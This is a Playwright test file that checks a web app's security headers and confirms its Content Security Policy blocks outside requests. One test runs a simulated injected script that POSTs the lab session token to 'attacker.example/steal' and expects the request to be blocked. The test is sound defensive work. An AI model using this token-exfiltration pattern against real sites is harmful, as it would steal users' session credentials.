import { expect, test } from "@playwright/test";

import { API_DIRECT_URL, API_URL, PROXY_MODE } from "./ports";

// D-013: the production web build sends a CSP and related headers, and the app runs under them without
// a single violation (every other e2e test also runs under this policy).

test("web pages carry the security headers", async ({ page }) => {
  const resp = await page.goto("/");
  const h = resp!.headers();
  expect(h["content-security-policy"]).toContain("frame-ancestors 'none'");
  if (PROXY_MODE) {
    // Same-origin proxy: the page may talk to nothing but its own origin.
    expect(h["content-security-policy"]).toContain("connect-src 'self';");
  } else {
    expect(h["content-security-policy"]).toContain(`connect-src 'self' ${API_URL}`);
  }
  expect(h["content-security-policy"]).toContain("object-src 'none'");
  expect(h["x-content-type-options"]).toBe("nosniff");
  expect(h["referrer-policy"]).toBe("no-referrer");
  expect(h["x-frame-options"]).toBe("DENY");
  expect(h["x-powered-by"]).toBeUndefined();
});

test("the full journey runs under the CSP with no violations, and exfiltration to other hosts is blocked", async ({ page }) => {
  const violations: string[] = [];
  page.on("console", (m) => {
    if (/Content Security Policy/i.test(m.text())) violations.push(m.text());
  });
  await page.goto("/");
  await page.getByRole("button", { name: "Start a lab" }).click();
  const nav = (name: string) =>
    page.getByRole("navigation", { name: "Primary" }).getByRole("link", { name, exact: true }).click();
  await nav("Digital Keys");
  await page.getByLabel("Label").fill("Phone");
  await page.getByRole("button", { name: "Generate & enroll key" }).click();
  await expect(page.getByText("in this browser", { exact: true })).toBeVisible();
  await nav("Garage");
  await page.getByRole("button", { name: "Request unlock" }).click();
  await expect(page.getByText("ALLOWED · UNLOCKED")).toBeVisible();
  for (const name of ["Inspector", "Attack Lab", "Proximity", "Analytics", "Account"]) await nav(name);
  expect(violations).toEqual([]);

  // An injected script trying to send the lab token elsewhere is stopped by connect-src.
  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://attacker.example/steal", { method: "POST", body: sessionStorage.getItem("keyguard.lab") });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
  expect(violations.some((v) => v.includes("attacker.example"))).toBe(true);
});

test("API responses carry their own strict headers", async ({ request }) => {
  const resp = await request.get(`${API_DIRECT_URL}/api/health`);
  expect(resp.headers()["content-security-policy"]).toBe("default-src 'none'; frame-ancestors 'none'");
  expect(resp.headers()["cache-control"]).toBe("no-store");
});
